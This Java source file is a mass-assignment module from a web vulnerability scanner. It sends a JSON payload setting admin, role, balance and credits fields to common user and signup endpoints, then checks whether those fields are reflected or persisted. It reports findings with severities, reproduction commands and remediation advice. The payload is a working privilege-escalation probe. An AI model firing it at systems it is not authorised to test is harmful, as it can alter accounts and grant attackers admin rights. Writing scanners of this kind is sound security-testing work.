package gg.effront.anarcry.scanner.web.massassign;

import gg.effront.anarcry.model.Finding;
import gg.effront.anarcry.model.Severity;
import gg.effront.anarcry.scanner.ScanContext;
import gg.effront.anarcry.scanner.Scanner;
import gg.effront.anarcry.scanner.util.Http;
import gg.effront.anarcry.scanner.util.HttpClientFactory;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.function.Consumer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import gg.effront.anarcry.model.CweRegistry;
import gg.effront.anarcry.model.CvssCalculator;

public class MassAssignmentModule implements Scanner {

    private static final String MASS_PAYLOAD =
            "{\"admin\":true,\"role\":\"admin\",\"isAdmin\":true,\"is_admin\":1," +
            "\"balance\":99999,\"credits\":99999,\"verified\":true," +
            "\"email_verified\":true,\"subscription_plan\":\"enterprise\"," +
            "\"privilege\":\"admin\",\"access_level\":9999,\"is_staff\":true}";

    private static final Pattern ADMIN_PATTERN = Pattern.compile(
            "(?i)(\"admin\"\\s*:\\s*true|\"role\"\\s*:\\s*\"admin\"|\"isAdmin\"\\s*:\\s*true" +
            "|\"is_admin\"\\s*:\\s*1|\"privilege\"\\s*:\\s*\"admin\"|\"access_level\"\\s*:\\s*9999" +
            "|\"subscription_plan\"\\s*:\\s*\"enterprise\"|\"is_staff\"\\s*:\\s*true)");

    private record Endpoint(String method, String path) {}

    private static final List<Endpoint> ENDPOINTS = List.of(
            new Endpoint("PUT",   "/api/user"),
            new Endpoint("PUT",   "/api/users/me"),
            new Endpoint("PUT",   "/api/profile"),
            new Endpoint("PUT",   "/api/me"),
            new Endpoint("PATCH", "/api/user"),
            new Endpoint("PATCH", "/api/profile"),
            new Endpoint("PATCH", "/api/me"),
            new Endpoint("POST",  "/api/register"),
            new Endpoint("POST",  "/api/signup"),
            new Endpoint("POST",  "/api/users")
    );

    @Override
    public String id() { return "MassAssign"; }

    @Override
    public List<Finding> scan(ScanContext ctx, Consumer<String> log) throws Exception {
        String _cweId     = CweRegistry.cweId(id());
        String _cweTitle  = CweRegistry.cweTitle(id());
        String _cveVector = CweRegistry.cvssVector(id());
        double _score     = CvssCalculator.calculate(_cveVector);
        List<Finding> findings = new ArrayList<>();

        String scheme  = ctx.isHttps() ? "https" : "http";
        int    defPort = ctx.isHttps() ? 443 : 80;
        String baseUrl = scheme + "://" + ctx.host()
                + (ctx.port() != defPort ? ":" + ctx.port() : "");

        HttpClient hc = HttpClientFactory.noRedirect();
        log.accept("[~] MassAssign: testando " + ENDPOINTS.size() + " endpoints em " + baseUrl);

        for (Endpoint ep : ENDPOINTS) {
            String url = baseUrl + ep.path();
            try {
                // Step 1: GET baseline to see if endpoint exists
                HttpRequest.Builder getBuilder = HttpRequest.newBuilder()
                        .uri(URI.create(url))
                        .timeout(Duration.ofSeconds(5))
                        .GET();
                if (!ctx.jwtToken().isBlank()) {
                    getBuilder.header("Authorization", "Bearer " + ctx.jwtToken());
                }
                HttpResponse<String> getResp = Http.send(ctx, hc, getBuilder.build(),
                        HttpResponse.BodyHandlers.ofString(), id());

                // Step 2: Send mutation with mass assignment payload
                HttpRequest.Builder mutBuilder = HttpRequest.newBuilder()
                        .uri(URI.create(url))
                        .timeout(Duration.ofSeconds(5))
                        .header("Content-Type", "application/json");
                if (!ctx.jwtToken().isBlank()) {
                    mutBuilder.header("Authorization", "Bearer " + ctx.jwtToken());
                }
                if ("PATCH".equals(ep.method())) {
                    mutBuilder.method("PATCH", HttpRequest.BodyPublishers.ofString(MASS_PAYLOAD));
                } else if ("PUT".equals(ep.method())) {
                    mutBuilder.PUT(HttpRequest.BodyPublishers.ofString(MASS_PAYLOAD));
                } else {
                    mutBuilder.POST(HttpRequest.BodyPublishers.ofString(MASS_PAYLOAD));
                }

                HttpResponse<String> mutResp = Http.send(ctx, hc, mutBuilder.build(),
                        HttpResponse.BodyHandlers.ofString(), id());

                int status = mutResp.statusCode();
                String body = mutResp.body() != null ? mutResp.body() : "";

                // CRITICAL: response reflects admin fields (skip HTML — SPA catch-all FP)
                if ((status == 200 || status == 201) && !isHtml(body) && ADMIN_PATTERN.matcher(body).find()) {
                    log.accept("[!!] MassAssign: CRITICAL — " + ep.method() + " " + ep.path()
                            + " refletiu campos admin");
                    findings.add(Finding.of("MassAssign", ep.path(),
                            "Mass Assignment — campos privilegiados aceitos via " + ep.method() + " " + ep.path(),
                            Severity.CRITICAL,
                            "URL: " + url + " | Método: " + ep.method()
                                    + " | Status: " + status
                                    + " | Body (300): " + body.substring(0, Math.min(300, body.length())),
                            "Servidor aceita e reflete campos como admin:true/role:admin no body de resposta — "
                                    + "atacante pode escalar privilégios enviando campos extras na requisição",
                            ep.method() + " " + url
                                    + " -H 'Content-Type: application/json'"
                                    + " -H 'Authorization: Bearer <TOKEN>'"
                                    + " -d '" + MASS_PAYLOAD + "'",
                            "Usar DTO explícito com @JsonIgnoreProperties(ignoreUnknown=false); "
                                    + "nunca mapear request body diretamente para entidade JPA; "
                                    + "allowlist de campos aceitos por endpoint",
                            _cweId, _cweTitle, _cveVector, _score));
                    continue;
                }

                // Potential mass assignment: endpoint accepts JSON with 200/201
                if ((status == 200 || status == 201) && !body.isBlank() && !isHtml(body)) {
                    // Only report if baseline GET also returned something (endpoint is real)
                    if (getResp.statusCode() == 200 || getResp.statusCode() == 404) {
                        // Try to extract ID from mutation response to confirm persistence
                        Pattern idPat = Pattern.compile("\"id\"\\s*:\\s*\"?([^\"\\s,}]+)\"?");
                        Matcher idMatcher = idPat.matcher(body);
                        String resourceId = idMatcher.find() ? idMatcher.group(1) : null;

                        // Build GET URL: prefer /{id} suffix if we have an ID
                        String verifyUrl = (resourceId != null) ? url + "/" + resourceId : url;
                        boolean persisted = false;
                        try {
                            HttpRequest.Builder verifyBuilder = HttpRequest.newBuilder()
                                    .uri(URI.create(verifyUrl))
                                    .timeout(Duration.ofSeconds(5))
                                    .GET();
                            if (!ctx.jwtToken().isBlank()) {
                                verifyBuilder.header("Authorization", "Bearer " + ctx.jwtToken());
                            }
                            HttpResponse<String> verifyResp = Http.send(ctx, hc, verifyBuilder.build(),
                                    HttpResponse.BodyHandlers.ofString(), id());
                            String verifyBody = verifyResp.body() != null ? verifyResp.body() : "";
                            if ((verifyResp.statusCode() == 200) && ADMIN_PATTERN.matcher(verifyBody).find()) {
                                persisted = true;
                                log.accept("[!!] MassAssign: HIGH — campo admin persistiu após GET em " + verifyUrl);
                            }
                        } catch (Exception ignored) {}

                        if (persisted) {
                            findings.add(Finding.of("MassAssign", ep.path(),
                                    "Mass Assignment — campo persistido via " + ep.method() + " " + ep.path(),
                                    Severity.HIGH,
                                    "URL: " + url + " | Método: " + ep.method()
                                            + " | Status: " + status
                                            + " | GET " + verifyUrl + " confirmou campo admin no body",
                                    "Servidor aceita E persiste campos privilegiados (admin/role) — "
                                            + "confirmado via GET após mutação. Escalada de privilégios confirmada.",
                                    ep.method() + " " + url
                                            + " -H 'Content-Type: application/json'"
                                            + " -H 'Authorization: Bearer <TOKEN>'"
                                            + " -d '" + MASS_PAYLOAD + "'\n"
                                            + "# Confirmar: GET " + verifyUrl,
                                    "Usar DTO explícito com @JsonIgnoreProperties(ignoreUnknown=false); "
                                            + "nunca mapear request body diretamente para entidade JPA; "
                                            + "allowlist de campos aceitos por endpoint"));
                        } else {
                            log.accept("[!] MassAssign: LOW — " + ep.method() + " " + ep.path()
                                    + " aceita JSON mas persistência não confirmada (possível FP)");
                            findings.add(Finding.of("MassAssign", ep.path(),
                                    "Mass Assignment — possível FP (não persistiu) via " + ep.method() + " " + ep.path(),
                                    Severity.LOW,
                                    "URL: " + url + " | Método: " + ep.method()
                                            + " | Status: " + status
                                            + " | GET " + verifyUrl + " não confirmou campo admin",
                                    "Endpoint aceita payload JSON com campos extras, mas GET subsequente não "
                                            + "confirmou persistência — pode ser FP ou campo ignorado silenciosamente",
                                    ep.method() + " " + url
                                            + " -H 'Content-Type: application/json'"
                                            + " -d '" + MASS_PAYLOAD + "'",
                                    "Verificar manualmente se campos como role/admin são persistidos; "
                                            + "usar DTO com allowlist explícita de campos"));
                        }
                    }
                }

            } catch (Exception e) {
                // Unreachable endpoint — expected
            }
        }

        if (findings.isEmpty()) {
            log.accept("[+] MassAssign: nenhum endpoint vulnerável detectado");
        }
        return findings;
    }

    private static boolean isHtml(String body) {
        String t = body.stripLeading();
        return t.startsWith("<!DOCTYPE") || t.startsWith("<html") || t.startsWith("<!doctype");
    }
}
